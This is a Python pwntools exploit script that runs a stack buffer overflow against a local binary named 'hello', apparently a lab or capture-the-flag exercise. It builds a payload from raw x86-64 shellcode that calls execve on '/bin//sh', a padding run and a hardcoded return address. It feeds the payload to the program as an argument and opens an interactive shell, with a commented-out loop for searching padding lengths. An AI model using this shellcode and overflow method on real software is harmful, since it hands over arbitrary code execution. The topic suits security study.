from pwn import *

import errno
import os
import signal
import functools

class TimeoutError(Exception):
    pass

def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
    def decorator(func):
        def _handle_timeout(signum, frame):
            # pass
            raise TimeoutError(error_message)

        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            signal.signal(signal.SIGALRM, _handle_timeout)
            signal.alarm(seconds)
            try:
                result = func(*args, **kwargs)
            finally:
                signal.alarm(0)
            return result

        return wrapper

    return decorator

from prepare_input import write_input_to_file
@timeout(5)
def pwn_hello(padding_length=6, include_program=False, include_rip_jump=False, do_interactive=False):
    # Start the process
    # exploit = 'f'
    # input = 'ff' + exploit
    print(f"testing with padding length {padding_length}")
    program = b'\x48\x31\xd2\x48\x31\xf6\x48\xb8\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd8\x50\x48\x89\xe7\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05'
    # rip_jump = b'\xa0\xdf\xff\xff\xff\x7f'
    rip_jump = b'\x30\xe4\xff\xff\xff\x7f'

    padding = b'\x30'*padding_length
    payload = b''
    if include_program:
        payload += program
    payload += padding
    if include_rip_jump:
        payload += rip_jump
    
    # f = open('program_input', 'wb')
    # f.write(payload)
    
    # data = open('program_input', 'rb').read()
    
    p = process(['./hello',  payload])

    # Print the response
    # data = p.recvall()
    if do_interactive:
        # data = p.recvall()
        p.interactive()
    else:
        data = p.recvall()


    lines = data.split(b'\n')
    print(lines)
    if b'$' in lines:
        exit()
    result = {}
    for item in lines:
        pieces = item.replace(b" ", b"").split(b':')
        if len(pieces) < 2:
            continue
        field = pieces[0]
        value = pieces[1]
        result[field] = value
    
    # print(p.proc.returncode)
    result['code'] = p.proc.returncode
    result['pad-length'] = padding_length
    print(result)
    return result

# for i in range(32):
    # pwn_hello(padding_length=i, include_rip_jump=True, include_program=True)

pwn_hello(padding_length=8, include_rip_jump=True, include_program=True, do_interactive=True)
